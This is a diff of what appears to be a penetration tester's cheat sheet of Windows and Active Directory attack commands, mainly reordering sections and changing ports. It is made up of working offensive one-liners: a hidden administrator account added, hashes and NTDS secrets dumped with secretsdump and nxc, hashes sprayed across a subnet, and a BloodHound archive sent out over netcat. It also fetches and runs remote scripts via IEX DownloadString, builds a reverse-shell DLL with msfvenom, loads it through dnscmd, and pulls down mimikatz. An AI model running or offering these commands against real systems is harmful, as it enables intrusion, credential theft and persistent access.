@@ -1751,20 +1751,9 @@ curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 \programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 
-+---------- Dump Hashes ----------+
-powershell -c "net user dbf 123qweasdF! /add ; net localgroup Administrators dbf /add"
-nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --local-auth --sam --lsa --dpapi
-impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
-nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' -M lsassy
-nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --use-kcache --lsa --sam --dpapi --ntds --user Administrator
-
-+---------- Spray Hashes ----------+
-nxc winrm 192.168.110.51-56 -u usernames -H hashes --local-auth
-nxc smb 192.168.110.51-56 -u usernames -H hashes --local-auth --shares
-
 +---------- Switch User: Known Creds ----------+
-//$MYIP/$/RunasCs.exe --bypass-uac --logon-type 8 $USERNAME $PASSWORD cmd.exe -r $MYIP:80
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:5566
+//$MYIP/$/RunasCs.exe --bypass-uac --logon-type 8 $USERNAME $PASSWORD cmd.exe -r $MYIP:8443
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:8443
 
 +---------- Restore AD Objects ----------+
 powershell -c "Restore-ADObject -Identity 'GUID or DistinguishedName'"
@@ -1774,12 +1763,12 @@ Invoke-Command -ComputerName SRV01 -ScriptBlock { whoami /priv }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { arp /a }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { ipconfig /all }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add }
+Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name programdata -Path "C:\ProgramData" -FullAccess dbf }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
 impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
-evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!' --spn-prefix cifs
-Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name ProgramData -Path "C:\ProgramData" -FullAccess dbf }
+evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
 impacket-smbclient 'dbf':'123qweasdF!'@$TARGET
-use SHARE
+use programdata
 put /Upload/windows/mimikatz.exe
 
 +---------- SeBackupPrivilege ----------+
@@ -1813,6 +1802,17 @@ rlwrap nc -lvnp 80
 impacket-smbserver $ /Upload/windows
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f dll -o /Upload/windows/x.dll
 dnscmd.exe /config /serverlevelplugindll \\$MYIP\$\x.dll
+
++---------- Dump Hashes ----------+
+powershell -c "net user dbf 123qweasdF! /add ; net localgroup Administrators dbf /add"
+nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --local-auth --sam --lsa --dpapi
+impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
+nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' -M lsassy
+nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --use-kcache --lsa --sam --dpapi --ntds --user Administrator
+
++---------- Spray Hashes ----------+
+nxc winrm 192.168.110.51-56 -u usernames -H hashes --local-auth
+nxc smb 192.168.110.51-56 -u usernames -H hashes --local-auth --shares
 
 +---------- DPAPI ----------+
 curl $MYIP/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
